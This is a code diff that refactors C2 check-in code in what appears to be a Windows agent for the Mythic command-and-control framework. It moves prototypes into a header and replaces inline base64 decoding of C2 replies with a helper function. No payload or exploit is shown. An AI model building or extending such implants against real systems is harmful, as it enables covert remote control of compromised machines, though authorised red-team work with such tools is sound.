@@ -7,18 +7,7 @@
 // External Dependencies from main.c (should be moved to separate headers
 // eventually)
 extern char current_uuid[128];
-extern char *send_c2_message(const char *json_msg);
-extern char *base64_decode(const char *src, size_t len);
-extern void extract_json_string(const char *key, const char *json, char *buffer,
-                                size_t buffer_size);
-// Note: argument order in extract_json_string prototype in main.c was (json,
-// key, buffer, size) Let me double check main.c... main.c: void
-// extract_json_string(const char *json, const char *key, char *buffer, size_t
-// buffer_size) So I must match it.
-
-// Redefining prototype to match main.c
-extern void extract_json_string(const char *json, const char *key, char *buffer,
-                                size_t buffer_size);
+#include "utils.h"
 
 #include <windows.h>
 
@@ -53,15 +42,7 @@ BOOL CheckinSend() {
   char *b64_resp = send_c2_message(json_msg);
 
   if (b64_resp && strlen(b64_resp) > 0) {
-    char *json_resp = base64_decode(b64_resp, strlen(b64_resp));
-
-    // Handle weird Mythic/Base64 offset if present (from main.c logic)
-    if (json_resp && json_resp[0] != '{') {
-      if (strlen(b64_resp) > 36) {
-        free(json_resp);
-        json_resp = base64_decode(b64_resp + 36, strlen(b64_resp) - 36);
-      }
-    }
+    char *json_resp = process_mythic_response(b64_resp, strlen(b64_resp));
 
     if (json_resp) {
       // Check for new UUID or success
